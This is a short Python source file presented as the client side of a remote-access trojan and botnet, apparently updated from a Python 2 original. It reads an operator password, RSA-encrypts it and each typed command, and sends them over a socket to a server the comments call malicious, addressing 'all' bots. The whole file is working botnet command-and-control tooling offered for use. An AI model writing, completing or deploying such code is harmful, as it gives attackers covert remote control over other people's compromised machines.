# A Python RAT n' Botnet
#  by Landon in Python2
#    CLIENT-SIDE C0DE

#
#Updated by a loser to Py3 and gave it some use
#

import socket, rsa
from colorama import Fore, init


publicKey = 'JUST PUBLIC KEY NOT THE HEADER OR FOOTER' #Put public key here
bigBro = '127.0.0.1' # Malicious Server IP.
bigBroPort = 3389 # Malicious Server Port.


pem_prefix = '-----BEGIN RSA PUBLIC KEY-----\n'
pem_suffix = '\n-----END RSA PUBLIC KEY-----'

key = '{}{}{}'.format(pem_prefix, publicKey, pem_suffix)

password = input("Password? > ")
auth = "authenticate " + password
pubKey = rsa.PublicKey.load_pkcs1(key)
authMessage = rsa.encrypt(auth.encode(), pubKey)

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(( bigBro, bigBroPort )) # To-do: Change port later. 

clientSocket.send(authMessage)

recipient = "all"
turnedOn = True
while turnedOn:
	sendCommand = input(recipient + "> ")
	message = recipient + " " + sendCommand
	encMessage = rsa.encrypt(message.encode(), pubKey)
	
	turnedOn = sendCommand[:4] != "exit"
	if turnedOn:
		clientSocket.send(encMessage)


clientSocket.close()
